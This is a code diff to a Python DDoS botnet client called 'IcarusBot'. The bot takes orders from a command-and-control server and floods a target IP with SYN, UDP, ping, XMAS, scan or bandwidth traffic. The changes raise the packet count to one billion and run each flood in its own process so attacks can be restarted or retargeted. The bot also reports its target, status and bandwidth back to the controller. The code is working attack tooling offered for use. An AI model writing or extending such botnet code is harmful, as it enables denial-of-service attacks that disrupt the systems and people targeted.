@@ -14,6 +14,7 @@ import speedtest
 import syn_flood
 import sys
 import threading
+import multiprocessing as mp
 import time
 import udp_flood
 import xmas_attack
@@ -23,7 +24,16 @@ from socket import timeout
 from win10toast import ToastNotifier
 
 BOT_ID_NAME = ''  # Replace this for each new bot handed out.
-NUM_PACKETS_TO_SEND = 1
+NUM_PACKETS_TO_SEND = 1000000000
+
+attackTypes = [
+    "SYN_FLOOD",
+    "UDP_FLOOD",
+    "PING_FLOOD",
+    "SCAN_FLOOD",
+    "XMAS_FLOOD",
+    "BANDWIDTH_DDOS"
+]
 
 def truncate(n, decimals=0):
     multiplier = 10 ** decimals
@@ -46,6 +56,7 @@ class IcarusBot:
         """
         file = open("bot_name.txt", "r")
         global BOT_ID_NAME
+        global NUM_PACKETS_TO_SEND
         BOT_ID_NAME = file.read()
         print(BOT_ID_NAME, "IS RUNNING")
 
@@ -62,10 +73,14 @@ class IcarusBot:
         self.c2_server_details = ()
 
         self.status = 'STARTED'
+        self.attack_type = 'NONE'
         self.attack_runtime = 0  # Used for tracking duration of attack.
         self.target_ip = ''
 
         self.exceptionsThrown = 0  # Tracks errors thrown during operation.
+
+        # This is to deal with the active subprocess
+        self.mp = None
 
         # This will constantly run and update with the nameserver.
         threading.Thread(target=self.update_with_nameserver, daemon=True).start()
@@ -168,6 +183,11 @@ class IcarusBot:
                     # Angus: We just keep running until a stop attack is issued.
                     # TODO: Specify port(s) to attack
                     try:
+                        if attack_type in attackTypes:
+                            self.attack_type = attack_type
+                            self.status = "ATTACKING"
+                            self.target_ip = target_ip
+
                         if attack_type == 'SYN_FLOOD':
                             # attack_thread = threading.Thread(target=syn_flood.SYN_Flood,args=(target_ip, NUM_PACKETS_TO_SEND, [1]))
                             # attack_thread.start()
@@ -178,19 +198,79 @@ class IcarusBot:
                             #                                   proc.start()
                             #                                   # Terminate the process
                             #                                   proc.terminate()  # sends a SIGTERM
-                            syn_flood.SYN_Flood(target_ip, NUM_PACKETS_TO_SEND, ports)
+
+                            # The following code is hilariously long and redundant, but who cares?
+                            if self.mp is None:
+                                self.mp = mp.Process(target=syn_flood.SYN_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, ports))
+                                self.mp.start()
+                            else:
+                                self.mp.terminate()
+                                self.mp = mp.Process(target=syn_flood.SYN_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, ports))
+                                self.mp.start()
                         elif attack_type == 'XMAS_FLOOD':
-                            xmas_attack.XMAS_Attack(target_ip, NUM_PACKETS_TO_SEND, ports)
+                            if self.mp is None:
+                                self.mp = mp.Process(target=xmas_attack.XMAS_Attack,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, ports))
+                                self.mp.start()
+                            else:
+                                self.mp.terminate()
+                                self.mp = mp.Process(target=xmas_attack.XMAS_Attack,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, ports))
+                                self.mp.start()
                         elif attack_type == 'PING_FLOOD':
-                            ping_flood.PING_Flood(target_ip, NUM_PACKETS_TO_SEND)
+                            if self.mp is None:
+                                self.mp = mp.Process(target=ping_flood.PING_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND))
+                                self.mp.start()
+                            else:
+                                self.mp.terminate()
+                                self.mp = mp.Process(target=ping_flood.PING_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND))
+                                self.mp.start()
                         elif attack_type == 'UDP_FLOOD':
-                            udp_flood.UDP_Flood(target_ip, NUM_PACKETS_TO_SEND, ports)
+                            if self.mp is None:
+                                self.mp = mp.Process(target=udp_flood.UDP_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, ports))
+                                self.mp.start()
+                            else:
+                                self.mp.terminate()
+                                self.mp = mp.Process(target=udp_flood.UDP_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, ports))
+                                self.mp.start()
                         elif attack_type == 'SCAN_FLOOD':
-                            scan_flood.SCAN_Flood(target_ip, NUM_PACKETS_TO_SEND)
+                            if self.mp is None:
+                                self.mp = mp.Process(target=scan_flood.SCAN_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND))
+                                self.mp.start()
+                            else:
+                                self.mp.terminate()
+                                self.mp = mp.Process(target=scan_flood.SCAN_Flood,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND))
+                                self.mp.start()
                         elif attack_type == 'BANDWIDTH_DDOS':
-                            bandwidth_ddos.BANDWIDTH_ddos(target_ip, NUM_PACKETS_TO_SEND, ports, 65495)
-                        else:
-                            print("No attack type specified")
+                            if self.mp is None:
+                                self.mp = mp.Process(target=bandwidth_ddos.BANDWIDTH_ddos,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, ports, 65495))
+                                self.mp.start()
+                            else:
+                                self.mp.terminate()
+                                self.mp = mp.Process(target=bandwidth_ddos.BANDWIDTH_ddos,
+                                                     args=(target_ip, NUM_PACKETS_TO_SEND, ports, 65495))
+                                self.mp.start()
+
+                        print("EXECUTING ATTACK:", attack_type)
+                        response = {
+                            'ip': self.ip,
+                            'status': self.status,
+                            'id': self.bot_id,
+                            'runtime': self.attack_runtime,
+                            'bandwidth': self.uploadBandwidth,
+                            'target': self.target_ip,
+                            'error': 'none',
+                            'exceptionsThrown': self.exceptionsThrown
+                        }
                     except Exception:
                         self.exceptionsThrown += 1
                         print("ERROR EXECUTING ATTACK")
@@ -208,9 +288,13 @@ class IcarusBot:
                 # This will then send the message back to the server, irrespective of the flag.
                 time.sleep(2)
                 self.sock.sendto(str.encode(response), (self.c2_server_details[0], int(self.c2_server_details[1])))
-            except timeout or Exception:
+            except timeout:
                 # the server has lagged out
                 print("timeout")
+                return
+            except Exception:
+                print("EXCEPTION")
+                self.exceptionsThrown += 1
                 return
 
     #
